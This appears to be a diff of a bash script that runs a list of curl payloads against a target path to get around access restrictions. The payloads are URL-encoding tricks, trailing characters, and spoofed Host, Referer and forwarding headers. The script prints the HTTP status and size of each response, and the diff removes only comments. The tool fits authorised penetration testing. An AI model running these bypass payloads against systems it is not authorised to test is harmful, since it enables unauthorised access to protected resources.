@@ -6,7 +6,7 @@ if [ $# -ne 2 ]; then
 fi
 
 declare -a curl_payloads=(
-    # Existing Bypasses
+
     "$1/$2%5c"
     "$1/$2%2F"
     "$1/$2+"
@@ -27,8 +27,6 @@ declare -a curl_payloads=(
     "-H \"X-Forwarded-Proto: https\" $1/$2"
     "-H \"Accept: */*\" $1/$2"
     "-H \"Expect: 100-continue\" $1/$2"
-
-    # New Bypasses
     "-H \"Referer: http://localhost\" $1/$2"
     "-H \"Host: 127.0.0.1\" $1/$2"
     "$1/$2."
@@ -56,7 +54,6 @@ declare -a curl_payloads=(
     "$1/$2/"
 )
 
-# Execute each curl payload and display HTTP response code and download size
 for payload in "${curl_payloads[@]}"; do
     response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $payload)
     echo "$response  --> $payload"
